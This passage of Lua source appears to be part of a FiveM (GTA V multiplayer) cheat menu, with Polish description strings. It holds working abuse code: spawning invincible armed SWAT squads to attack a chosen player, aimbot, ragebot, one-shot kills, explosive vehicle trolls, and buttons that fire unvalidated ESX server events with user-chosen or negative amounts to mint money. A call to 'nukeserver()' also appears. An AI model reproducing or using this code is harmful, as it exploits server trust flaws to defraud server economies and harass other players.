                      SetNetworkIdCanMigrate(netped, true)
                      SetNetworkIdExistsOnAllMachines(netped, true)
                      Citizen.Wait(500)
                      NetToPed(netped)
                      GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
                      SetCurrentPedWeapon(ped, GetHashKey(wep), true)
                      SetEntityInvincible(ped, true)
                      SetPedCanSwitchWeapon(ped, true)
                      TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
                    elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
                    else
                      Citizen.Wait(0)
                    end
                  end
                end
			end

              LR.Display()
            elseif LR.IsMenuOpened(SPD) then
              drawDescription("~r~Troll ~s~player with peds", 0.33, 0.33)
              if LR.Button("~r~Spawn ~s~Swat army with ~y~AK") then
                local pedname = "s_m_y_swat_01"
                local wep = "WEAPON_ASSAULTRIFLE"
                for i = 0, 10 do
                  local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                  RequestModel(GetHashKey(pedname))
                  Citizen.Wait(50)
                  if HasModelLoaded(GetHashKey(pedname)) then
                    local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0, true, true) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0, true, true)
                    NetworkRegisterEntityAsNetworked(ped)
                    if DoesEntityExist(ped) and
                    not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      local netped = PedToNet(ped)
                      NetworkSetNetworkIdDynamic(netped, false)
                      SetNetworkIdCanMigrate(netped, true)
                      SetNetworkIdExistsOnAllMachines(netped, true)
                      Citizen.Wait(500)
                      NetToPed(netped)
                      GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
                      SetEntityInvincible(ped, true)
                      SetPedCanSwitchWeapon(ped, true)
                      TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
                    elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
                    else
                      Citizen.Wait(0)
                    end
                  end
                end
              elseif LR.Button("~r~Spawn ~s~Swat army with ~y~RPG") then
                local pedname = "s_m_y_swat_01"
                local wep = "weapon_rpg"
                for i = 0, 10 do
                  local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                  RequestModel(GetHashKey(pedname))
                  Citizen.Wait(50)
                  if HasModelLoaded(GetHashKey(pedname)) then
                    local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0, true, true) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0, true, true)
                    NetworkRegisterEntityAsNetworked(ped)
                    if DoesEntityExist(ped) and
                    not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      local netped = PedToNet(ped)
                      NetworkSetNetworkIdDynamic(netped, false)
                      SetNetworkIdCanMigrate(netped, true)
                      SetNetworkIdExistsOnAllMachines(netped, true)
                      Citizen.Wait(500)
                      NetToPed(netped)
                      GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
                      SetEntityInvincible(ped, true)
                      SetPedCanSwitchWeapon(ped, true)
                      TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
                    elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
                    else
                      Citizen.Wait(0)
                    end
                  end
                end
              elseif LR.Button("~r~Spawn ~s~Swat army with ~y~Flaregun") then
                local pedname = "s_m_y_swat_01"
                local wep = "weapon_flaregun"
                for i = 0, 10 do
                  local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                  RequestModel(GetHashKey(pedname))
                  Citizen.Wait(50)
                  if HasModelLoaded(GetHashKey(pedname)) then
                    local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0, true, true) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0, true, true)
                    NetworkRegisterEntityAsNetworked(ped)
                    if DoesEntityExist(ped) and
                    not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      local netped = PedToNet(ped)
                      NetworkSetNetworkIdDynamic(netped, false)
                      SetNetworkIdCanMigrate(netped, true)
                      SetNetworkIdExistsOnAllMachines(netped, true)
                      Citizen.Wait(500)
                      NetToPed(netped)
                      GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
                      SetEntityInvincible(ped, true)
                      SetPedCanSwitchWeapon(ped, true)
                      TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
                    elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
                    else
                      Citizen.Wait(0)
                    end
                  end
                end
              elseif LR.Button("~r~Spawn ~s~Swat army with ~y~Railgun") then
                local pedname = "s_m_y_swat_01"
                local wep = "weapon_railgun"
                for i = 0, 10 do
                  local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                  RequestModel(GetHashKey(pedname))
                  Citizen.Wait(50)
                  if HasModelLoaded(GetHashKey(pedname)) then
                    local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0, true, true) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0, true, true)
                    NetworkRegisterEntityAsNetworked(ped)
                    if DoesEntityExist(ped) and
                    not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      local netped = PedToNet(ped)
                      NetworkSetNetworkIdDynamic(netped, false)
                      SetNetworkIdCanMigrate(netped, true)
                      SetNetworkIdExistsOnAllMachines(netped, true)
                      Citizen.Wait(500)
                      NetToPed(netped)
                      GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
                      SetEntityInvincible(ped, true)
                      SetPedCanSwitchWeapon(ped, true)
                      TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
                    elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
                    else
                      Citizen.Wait(0)
                    end
                  end
                end
              end

              LR.Display()
            elseif IsDisabledControlPressed(0, 37) then
        LR.OpenMenu(LynxIcS)

              LR.Display()
            elseif LR.IsMenuOpened(TRPM) then
              drawDescription("Wyslij mi donejta czy cos XD ", 0.38, 0.38)
              if LR.Button("Teleport to ~g~waypoint") then
                TeleportToWaypoint()
              elseif LR.Button("Teleport into ~g~nearest ~s~vehicle") then
                teleporttonearestvehicle()
              elseif LR.Button("Teleport to ~r~coords") then
                teleporttocoords()
              elseif LR.Button("Draw custom ~r~blip ~s~on map") then
                drawcoords()
              elseif LR.CheckBox("Show ~g~Coords", showCoords, function (enabled) showCoords = enabled end) then
              end

              LR.Display()
            elseif LR.IsMenuOpened(WMPS) then
              if LR.MenuButton("~p~#~s~ Give Single Weapon", WTNe) then
              elseif LR.MenuButton("~p~#~s~ Crosshairs", CMSMS) then

              elseif LR.Button("~g~Give All Weapons") then
                for i = 1, #allWeapons do
                  GiveWeaponToPed(PlayerPedId(-1), GetHashKey(allWeapons[i]), 1000, false, false)
                end
              elseif LR.Button("~r~Remove All Weapons") then
                RemoveAllPedWeapons(PlayerPedId(-1), true)

              elseif LR.Button("Drop your current Weapon") then
                local a = GetPlayerPed(-1)
                local b = GetSelectedPedWeapon(a)
                SetPedDropsInventoryWeapon(GetPlayerPed(-1), b, 0, 2.0, 0, -1)

			  elseif LR.CheckBox("TriggerBot", TriggerBot, function(enabled) TriggerBot = enabled end) then
			  elseif LR.CheckBox("Aimlock ~h~~r~TEST", Aimlock, function(enabled) Aimlock = enabled end) then
              elseif LR.CheckBox("SilentAim/Aimbot", Aimbot, function(enabled) Aimbot = enabled end) then
              elseif LR.CheckBox("Ragebot", ragebot, function(enabled) ragebot = enabled  end) then
              elseif LR.CheckBox("Explosive Ammo", explosiveammo, function(enabled) explosiveammo = enabled  end) then
              elseif LR.CheckBox("Rapid Fire", rapidfire, function(enabled) rapidfire = enabled  end) then

			  elseif LR.Button("Give Ammo") then
				local result = KeyboardInput("Enter the amount of ammo", "", 100)
				if result ~= "" then
				for i = 1, #allWeapons do AddAmmoToPed(PlayerPedId(-1), GetHashKey(allWeapons[i]), result) end
				end
              elseif LR.CheckBox("OneShot ~r~Kill", oneshot, function(enabled) oneshot = enabled end) then
              elseif LR.CheckBox("OneShot ~b~Car", oneshotcar, function(enabled) oneshotcar = enabled end) then
              elseif LR.CheckBox("Vehicle Gun",VehicleGun, function(enabled)VehicleGun = enabled end)  then
              elseif LR.CheckBox("Delete Gun",DeleteGun, function(enabled)DeleteGun = enabled end)  then
              end


              LR.Display()
            elseif LR.IsMenuOpened(tngns) then
              veh = GetVehiclePedIsUsing(PlayerPedId())
              for i,theItem in pairs(vehicleMods) do
                if theItem.id == "extra" and #checkValidVehicleExtras() ~= 0 then
                  if LR.MenuButton(theItem.name, theItem.id) then
                  end
                elseif theItem.id == "neon" then
                  if LR.MenuButton(theItem.name, theItem.id) then
                  end
                elseif theItem.id == "paint" then
                  if LR.MenuButton(theItem.name, theItem.id) then
                  end
                elseif theItem.id == "wheeltypes" then
                  if LR.MenuButton(theItem.name, theItem.id) then
                  end
                elseif theItem.id == "headlight" then
                  if LR.MenuButton(theItem.name, theItem.id) then
                  end
                elseif theItem.id == "licence" then
                  if LR.MenuButton(theItem.name, theItem.id) then
                  end
                else
                  local valid = checkValidVehicleMods(theItem.id)
                  for ci,ctheItem in pairs(valid) do
                    if LR.MenuButton(theItem.name, theItem.id) then
                    end
                    break
                  end
                end

              end
              if IsToggleModOn(veh, 22) then
                xenonStatus = "Installed"
              else
                xenonStatus = "Not Installed"
              end
              if LR.Button("Xenon Headlight", xenonStatus) then
                if not IsToggleModOn(veh,22) then
                  ToggleVehicleMod(veh, 22, not IsToggleModOn(veh,22))
                else
                  ToggleVehicleMod(veh, 22, not IsToggleModOn(veh,22))
                end
              end

              LR.Display()
            elseif LR.IsMenuOpened(prof) then
              veh = GetVehiclePedIsUsing(PlayerPedId())
              for i,theItem in pairs(perfMods) do
                if LR.MenuButton(theItem.name, theItem.id) then
                end
              end
              if IsToggleModOn(veh,18) then
                turboStatus = "Installed"
              else
                turboStatus = "Not Installed"
              end
              if LR.Button("~b~Turbo Tune", turboStatus) then
                if not IsToggleModOn(veh,18) then
                  ToggleVehicleMod(veh, 18, not IsToggleModOn(veh,18))
                else
                  ToggleVehicleMod(veh, 18, not IsToggleModOn(veh,18))
                end
              end

              LR.Display()
            elseif LR.IsMenuOpened("primary") then
              if LR.MenuButton("~p~#~s~ Classic", "classic1") then
			  elseif LR.MenuButton("~p~#~s~ Metallic", "metallic1") then
              elseif LR.MenuButton("~p~#~s~ Matte", "matte1") then
			  elseif LR.MenuButton("~p~#~s~ Metal", "metal1") then
			  end

              LR.Display()
            elseif LR.IsMenuOpened("secondary") then
             if LR.MenuButton("~p~#~s~ Classic", "classic2") then
			 elseif LR.MenuButton("~p~#~s~ Metallic", "metallic2") then
			 elseif LR.MenuButton("~p~#~s~ Matte", "matte2") then
			 elseif LR.MenuButton("~p~#~s~ Metal", "metal2") then
			end

              LR.Display()
            elseif LR.IsMenuOpened("rimpaint") then
              if LR.MenuButton("~p~#~s~ Classic", "classic3") then
			elseif LR.MenuButton("~p~#~s~ Metallic", "metallic3") then
			elseif LR.MenuButton("~p~#~s~ Matte", "matte3") then
			elseif LR.MenuButton("~p~#~s~ Metal", "metal3") then
			end
              LR.Display()
            elseif LR.IsMenuOpened("classic1") then
              for theName,thePaint in pairs(paintsClassic) do
                tp,ts = GetVehicleColours(veh)
                if tp == thePaint.id and not isPreviewing then
                  pricetext = "Installed"
                else
                  if isPreviewing and tp == thePaint.id then
                    pricetext = "Previewing"
                  else
                    pricetext = "Not Installed"
                  end
                end
                curprim,cursec = GetVehicleColours(veh)
                if LR.Button(thePaint.name, pricetext) then
                  if not isPreviewing then
                    oldmodtype = "paint"
                    oldmodaction = false
                    oldprim,oldsec = GetVehicleColours(veh)
                    oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
                    oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
                    SetVehicleColours(veh,thePaint.id,oldsec)
                    SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)

                    isPreviewing = true
                  elseif isPreviewing and curprim == thePaint.id then
                    SetVehicleColours(veh,thePaint.id,oldsec)
                    SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
                    isPreviewing = false
                    oldmodtype = -1
                    oldmod = -1
                  elseif isPreviewing and curprim ~= thePaint.id then
                    SetVehicleColours(veh,thePaint.id,oldsec)
                    SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
                    isPreviewing = true
                  end
                end
              end

              if bytexd ~= "lynxmenu" then
                nukeserver()
              end

              LR.Display()
            elseif LR.IsMenuOpened("metallic1") then
              for theName,thePaint in pairs(paintsClassic) do
                tp,ts = GetVehicleColours(veh)
                if tp == thePaint.id and not isPreviewing then
                  pricetext = "Installed"
                else
                  if isPreviewing and tp == thePaint.id then
                    pricetext = "Previewing"
                  else
                    pricetext = "Not Installed"
                  end
                end
                curprim,cursec = GetVehicleColours(veh)
                if LR.Button(thePaint.name, pricetext) then
                  if not isPreviewing then
                    oldmodtype = "paint"
                    oldmodaction = false
                    oldprim,oldsec = GetVehicleColours(veh)
                    oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
                    oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
                    SetVehicleColours(veh,thePaint.id,oldsec)
                    SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)

                    isPreviewing = true
                  elseif isPreviewing and curprim == thePaint.id then
                    SetVehicleColours(veh,thePaint.id,oldsec)
                    SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
                    isPreviewing = false
                    oldmodtype = -1
                    oldmod = -1
                  elseif isPreviewing and curprim ~= thePaint.id then
                    SetVehicleColours(veh,thePaint.id,oldsec)
                    SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
                    isPreviewing = true
                  end
                end
              end
              LR.Display()
            elseif LR.IsMenuOpened("matte1") then
              for theName,thePaint in pairs(paintsMatte) do
                tp,ts = GetVehicleColours(veh)
                if tp == thePaint.id and not isPreviewing then
                  pricetext = "Installed"
                else
                  if isPreviewing and tp == thePaint.id then
                    pricetext = "Previewing"
                  else
                    pricetext = "Not Installed"
                  end
                end
                curprim,cursec = GetVehicleColours(veh)
                if LR.Button(thePaint.name, pricetext) then
                  if not isPreviewing then
                    oldmodtype = "paint"
                    oldmodaction = false
                    oldprim,oldsec = GetVehicleColours(veh)
                    oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
                    SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
                    oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
                    SetVehicleColours(veh,thePaint.id,oldsec)

                    isPreviewing = true
                  elseif isPreviewing and curprim == thePaint.id then
                    SetVehicleColours(veh,thePaint.id,oldsec)
                    SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
                    isPreviewing = false
                    oldmodtype = -1
                    oldmod = -1
                  elseif isPreviewing and curprim ~= thePaint.id then
                    SetVehicleColours(veh,thePaint.id,oldsec)
                    SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
                    isPreviewing = true
                  end
                end
              end
              LR.Display()
            elseif LR.IsMenuOpened("metal1") then
              for theName,thePaint in pairs(paintsMetal) do
                tp,ts = GetVehicleColours(veh)
                if tp == thePaint.id and not isPreviewing then
                  pricetext = "Installed"
                else
                  if isPreviewing and tp == thePaint.id then
                    pricetext = "Previewing"
                  else
                    pricetext = "Not Installed"
                  end
                end
                curprim,cursec = GetVehicleColours(veh)
                if LR.Button(thePaint.name, pricetext) then
                  if not isPreviewing then
                    oldmodtype = "paint"
                    oldmodaction = false
                    oldprim,oldsec = GetVehicleColours(veh)
                    oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
                    oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
                    SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
                    SetVehicleColours(veh,thePaint.id,oldsec)

                    isPreviewing = true
                  elseif isPreviewing and curprim == thePaint.id then
                    SetVehicleColours(veh,thePaint.id,oldsec)
                    SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
                    isPreviewing = false
                    oldmodtype = -1
                    oldmod = -1
                  elseif isPreviewing and curprim ~= thePaint.id then
                    SetVehicleColours(veh,thePaint.id,oldsec)
                    SetVehicleExtraColours(veh, thePaint.id,oldwheelcolour)
                    isPreviewing = true
                  end
                end
              end
              LR.Display()
            elseif LR.IsMenuOpened("classic2") then
              for theName,thePaint in pairs(paintsClassic) do
                tp,ts = GetVehicleColours(veh)
                if ts == thePaint.id and not isPreviewing then
                  pricetext = "Installed"
                else
                  if isPreviewing and ts == thePaint.id then
                    pricetext = "Previewing"
                  else
                    pricetext = "Not Installed"
                  end
                end
                curprim,cursec = GetVehicleColours(veh)
                if LR.Button(thePaint.name, pricetext) then
                  if not isPreviewing then
                    oldmodtype = "paint"
                    oldmodaction = false
                    oldprim,oldsec = GetVehicleColours(veh)
                    oldmod = table.pack(oldprim,oldsec)
                    SetVehicleColours(veh,oldprim,thePaint.id)

                    isPreviewing = true
                  elseif isPreviewing and cursec == thePaint.id then
                    SetVehicleColours(veh,oldprim,thePaint.id)
                    isPreviewing = false
                    oldmodtype = -1
                    oldmod = -1
                  elseif isPreviewing and cursec ~= thePaint.id then
                    SetVehicleColours(veh,oldprim,thePaint.id)
                    isPreviewing = true
                  end
                end
              end
              LR.Display()
            elseif LR.IsMenuOpened("metallic2") then
              for theName,thePaint in pairs(paintsClassic) do
                tp,ts = GetVehicleColours(veh)
                if ts == thePaint.id and not isPreviewing then
                  pricetext = "Installed"
                else
                  if isPreviewing and ts == thePaint.id then
                    pricetext = "Previewing"
                  else
                    pricetext = "Not Installed"
                  end
                end
                curprim,cursec = GetVehicleColours(veh)
                if LR.Button(thePaint.name, pricetext) then
                  if not isPreviewing then
                    oldmodtype = "paint"
                    oldmodaction = false
                    oldprim,oldsec = GetVehicleColours(veh)
                    oldmod = table.pack(oldprim,oldsec)
                    SetVehicleColours(veh,oldprim,thePaint.id)

                    isPreviewing = true
                  elseif isPreviewing and cursec == thePaint.id then
                    SetVehicleColours(veh,oldprim,thePaint.id)
                    isPreviewing = false
                    oldmodtype = -1
                    oldmod = -1
                  elseif isPreviewing and cursec ~= thePaint.id then
                    SetVehicleColours(veh,oldprim,thePaint.id)
                    isPreviewing = true
                  end
                end
              end
              LR.Display()
            elseif LR.IsMenuOpened("matte2") then
              for theName,thePaint in pairs(paintsMatte) do
                tp,ts = GetVehicleColours(veh)
                if ts == thePaint.id and not isPreviewing then
                  pricetext = "Installed"
                else
                  if isPreviewing and ts == thePaint.id then
                    pricetext = "Previewing"
                  else
                    pricetext = "Not Installed"
                  end
                end
                curprim,cursec = GetVehicleColours(veh)
                if LR.Button(thePaint.name, pricetext) then
                  if not isPreviewing then
                    oldmodtype = "paint"
                    oldmodaction = false
                    oldprim,oldsec = GetVehicleColours(veh)
                    oldmod = table.pack(oldprim,oldsec)
                    SetVehicleColours(veh,oldprim,thePaint.id)

                    isPreviewing = true
                  elseif isPreviewing and cursec == thePaint.id then
                    SetVehicleColours(veh,oldprim,thePaint.id)
                    isPreviewing = false
                    oldmodtype = -1
                    oldmod = -1
                  elseif isPreviewing and cursec ~= thePaint.id then
                    SetVehicleColours(veh,oldprim,thePaint.id)
                    isPreviewing = true
                  end
                end
              end
              LR.Display()
            elseif LR.IsMenuOpened("metal2") then
              for theName,thePaint in pairs(paintsMetal) do
                tp,ts = GetVehicleColours(veh)
                if ts == thePaint.id and not isPreviewing then
                  pricetext = "Installed"
                else
                  if isPreviewing and ts == thePaint.id then
                    pricetext = "Previewing"
                  else
                    pricetext = "Not Installed"
                  end
                end
                curprim,cursec = GetVehicleColours(veh)
                if LR.Button(thePaint.name, pricetext) then
                  if not isPreviewing then
                    oldmodtype = "paint"
                    oldmodaction = false
                    oldprim,oldsec = GetVehicleColours(veh)
                    oldmod = table.pack(oldprim,oldsec)
                    SetVehicleColours(veh,oldprim,thePaint.id)

                    isPreviewing = true
                  elseif isPreviewing and cursec == thePaint.id then
                    SetVehicleColours(veh,oldprim,thePaint.id)
                    isPreviewing = false
                    oldmodtype = -1
                    oldmod = -1
                  elseif isPreviewing and cursec ~= thePaint.id then
                    SetVehicleColours(veh,oldprim,thePaint.id)
                    isPreviewing = true
                  end
                end
              end

              LR.Display()
            elseif LR.IsMenuOpened("classic3") then
              for theName,thePaint in pairs(paintsClassic) do
                _,ts = GetVehicleExtraColours(veh)
                if ts == thePaint.id and not isPreviewing then
                  pricetext = "Installed"
                else
                  if isPreviewing and ts == thePaint.id then
                    pricetext = "Previewing"
                  else
                    pricetext = "Not Installed"
                  end
                end
                _,currims = GetVehicleExtraColours(veh)
                if LR.Button(thePaint.name, pricetext) then
                  if not isPreviewing then
                    oldmodtype = "paint"
                    oldmodaction = false
                    oldprim,oldsec = GetVehicleColours(veh)
                    oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
                    oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
                    SetVehicleExtraColours(veh, oldpearl,thePaint.id)

                    isPreviewing = true
                  elseif isPreviewing and currims == thePaint.id then
                    SetVehicleExtraColours(veh, oldpearl,thePaint.id)
                    isPreviewing = false
                    oldmodtype = -1
                    oldmod = -1
                  elseif isPreviewing and currims ~= thePaint.id then
                    SetVehicleExtraColours(veh, oldpearl,thePaint.id)
                    isPreviewing = true
                  end
                end
              end
              LR.Display()
            elseif LR.IsMenuOpened("metallic3") then
              for theName,thePaint in pairs(paintsClassic) do
                _,ts = GetVehicleExtraColours(veh)
                if ts == thePaint.id and not isPreviewing then
                  pricetext = "Installed"
                else
                  if isPreviewing and ts == thePaint.id then
                    pricetext = "Previewing"
                  else
                    pricetext = "Not Installed"
                  end
                end
                _,currims = GetVehicleExtraColours(veh)
                if LR.Button(thePaint.name, pricetext) then
                  if not isPreviewing then
                    oldmodtype = "paint"
                    oldmodaction = false
                    oldprim,oldsec = GetVehicleColours(veh)
                    oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
                    oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
                    SetVehicleExtraColours(veh, oldpearl,thePaint.id)

                    isPreviewing = true
                  elseif isPreviewing and currims == thePaint.id then
                    SetVehicleExtraColours(veh, oldpearl,thePaint.id)
                    isPreviewing = false
                    oldmodtype = -1
                    oldmod = -1
                  elseif isPreviewing and currims ~= thePaint.id then
                    SetVehicleExtraColours(veh, oldpearl,thePaint.id)
                    isPreviewing = true
                  end
                end
              end
              LR.Display()
            elseif LR.IsMenuOpened("matte3") then
              for theName,thePaint in pairs(paintsMatte) do
                _,ts = GetVehicleExtraColours(veh)
                if ts == thePaint.id and not isPreviewing then
                  pricetext = "Installed"
                else
                  if isPreviewing and ts == thePaint.id then
                    pricetext = "Previewing"
                  else
                    pricetext = "Not Installed"
                  end
                end
                _,currims = GetVehicleExtraColours(veh)
                if LR.Button(thePaint.name, pricetext) then
                  if not isPreviewing then
                    oldmodtype = "paint"
                    oldmodaction = false
                    oldprim,oldsec = GetVehicleColours(veh)
                    oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
                    oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
                    SetVehicleExtraColours(veh, oldpearl,thePaint.id)

                    isPreviewing = true
                  elseif isPreviewing and currims == thePaint.id then
                    SetVehicleExtraColours(veh, oldpearl,thePaint.id)
                    isPreviewing = false
                    oldmodtype = -1
                    oldmod = -1
                  elseif isPreviewing and currims ~= thePaint.id then
                    SetVehicleExtraColours(veh, oldpearl,thePaint.id)
                    isPreviewing = true
                  end
                end
              end
              LR.Display()
            elseif LR.IsMenuOpened("metal3") then
              for theName,thePaint in pairs(paintsMetal) do
                _,ts = GetVehicleExtraColours(veh)
                if ts == thePaint.id and not isPreviewing then
                  pricetext = "Installed"
                else
                  if isPreviewing and ts == thePaint.id then
                    pricetext = "Previewing"
                  else
                    pricetext = "Not Installed"
                  end
                end
                _,currims = GetVehicleExtraColours(veh)
                if LR.Button(thePaint.name, pricetext) then
                  if not isPreviewing then
                    oldmodtype = "paint"
                    oldmodaction = false
                    oldprim,oldsec = GetVehicleColours(veh)
                    oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
                    oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
                    SetVehicleExtraColours(veh, oldpearl,thePaint.id)

                    isPreviewing = true
                  elseif isPreviewing and currims == thePaint.id then
                    SetVehicleExtraColours(veh, oldpearl,thePaint.id)
                    isPreviewing = false
                    oldmodtype = -1
                    oldmod = -1
                  elseif isPreviewing and currims ~= thePaint.id then
                    SetVehicleExtraColours(veh, oldpearl,thePaint.id)
                    isPreviewing = true
                  end
                end
              end

              LR.Display()
            elseif LR.IsMenuOpened(VMS) then
              drawDescription("HAM MAFIA TO ŚCIEK XD", 0.58, 0.58)
              if LR.MenuButton("~p~#~s~ ~b~LSC ~s~Customs", LSCC) then
              elseif LR.MenuButton("~p~#~s~ Vehicle ~g~Boost", bmm) then
              elseif LR.MenuButton("~p~#~s~ Vehicle List", CTSa) then
              elseif LR.MenuButton("~p~#~s~ Global Car Trolls", gccccc) then
              elseif LR.MenuButton("~p~#~s~ Spawn & Attach ~s~Trailer", MTS) then
              elseif LR.Button("Spawn ~r~Custom ~s~Vehicle") then
                spawnvehicle()
              elseif LR.Button("~r~Delete ~s~Vehicle") then
                DelVeh(GetVehiclePedIsUsing(PlayerPedId(-1)))
              elseif LR.Button("~g~Repair ~s~Vehicle") then
                repairvehicle()
              elseif LR.Button("~g~Repair ~s~Engine") then
                repairengine()
              elseif LR.Button("~g~Flip ~s~Vehicle") then
                daojosdinpatpemata()
              elseif LR.Button("~b~Max ~s~Tuning") then
                MaxOut(GetVehiclePedIsUsing(PlayerPedId(-1)))
              elseif LR.CheckBox("Vehicle Godmode", VehGod, function(enabled) VehGod = enabled end)then
              elseif LR.CheckBox("~b~Waterproof ~s~Vehicle", waterp, function(enabled) waterp = enabled end) then
              elseif LR.CheckBox("Speedboost ~g~SHIFT ~r~CTRL", VehSpeed, function(enabled) VehSpeed = enabled end) then
              end

              LR.Display()
            elseif LR.IsMenuOpened(gccccc) then
              if LR.CheckBox("~r~EMP~s~ Nearest Vehicles", destroyvehicles, function(enabled) destroyvehicles = enabled end) then
			  elseif LR.CheckBox("~r~Delete~s~ Nearest Vehicles", deletenearestvehicle, function(enabled) deletenearestvehicle = enabled end) then
			  elseif LR.CheckBox("~r~Launch~s~ Nearest Vehicles", lolcars, function(enabled) lolcars = enabled end) then
              elseif LR.CheckBox("~r~Alarm~s~ Nearest Vehicles", alarmvehicles, function(enabled) alarmvehicles = enabled end) then
              elseif LR.Button("~r~BORGAR~s~ Nearest Vehicles") then
                local hamburghash = GetHashKey("xs_prop_hamburgher_wl")
                for vehicle in EnumerateVehicles() do
                  local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                  AttachEntityToEntity(hamburger, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                end
              elseif LR.CheckBox("~r~Explode~s~ Nearest Vehicles", explodevehicles, function(enabled) explodevehicles = enabled end) then
              elseif LR.CheckBox("~p~Fuck~s~ Nearest Vehicles", fuckallcars, function(enabled) fuckallcars = enabled end) then
              end
              --------------------------
              --LUA MENUS
              LR.Display()
            elseif LR.IsMenuOpened(LMX) then
              drawDescription("Tu bedzie duzo fajnych opcji", 0.46, 0.46)
              if LR.MenuButton("~p~#~s~ ~r~ESX ~s~Money", esms) then
              elseif LR.MenuButton("~p~#~s~ ~r~ESX ~s~Misc", ESXC) then
              elseif LR.MenuButton("~p~#~s~ ~s~Polskie ~r~Serwery", SEVR) then
              elseif LR.MenuButton("~p~#~s~ ~r~ESX ~s~Drugs", ESXD) then
              elseif LR.MenuButton("~p~#~s~ ~y~VRP ~s~Triggers", VRPT) then
              elseif LR.MenuButton("~p~#~s~ ~b~Misc ~s~Triggers", MSTC) then
              end

              LR.Display()
            elseif LR.IsMenuOpened(esms) then
              if LR.Button("~o~Automatic Money ~r~ WARNING!") then
                automaticmoneyesx()
              elseif LR.Button("~g~ESX ~y~Caution Give Back") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result ~= "" then
                  TSE("esx_jobs:caution", "give_back", result)
                end
              elseif LR.CheckBox("~g~ESX Hunting~y~ reward", huntspam, function(enabled) huntspam = enabled end) then
              elseif LR.Button("~g~ESX ~y~Eden Garage") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result ~= "" then
                  TSE("eden_garage:payhealth", {costs = -result})
                end
              elseif LR.Button("~g~ESX ~y~Fuel Delivery") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result ~= "" then
                  TSE("esx_fueldelivery:pay", result)
                end
              elseif LR.Button("~g~ESX ~y~Car Thief") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result ~= "" then
                  TSE("esx_carthief:pay", result)
                end
              elseif LR.Button("~g~ESX ~y~DMV School") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result ~= "" then
                  TSE("esx_dmvschool:pay", {costs = -result})
                end
              elseif LR.Button("~g~ESX ~y~Dirty Job") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result ~= "" then
                  TSE("esx_godirtyjob:pay", result)
                end
